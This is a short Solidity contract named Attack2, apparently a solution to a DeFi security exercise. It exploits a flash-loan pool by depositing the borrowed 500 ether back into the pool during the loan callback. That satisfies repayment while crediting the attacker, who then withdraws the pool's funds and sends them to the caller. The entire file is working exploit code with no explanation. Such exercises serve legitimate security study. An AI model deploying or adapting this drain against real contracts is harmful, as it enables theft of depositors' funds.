//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlash {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Attack2 {
  address targetContract;

  constructor(address _targetContract) {
    targetContract = _targetContract;
  }

  function attack() external {
    IFlash(targetContract).flashLoan(500 ether);
    IFlash(targetContract).withdraw();
    uint256 amount = address(this).balance;
    payable(msg.sender).call{value: amount}("");
  }

  function receiveLoan() external payable {
    IFlash(targetContract).deposit{value: 500 ether}();
  }

  fallback() external payable {}
}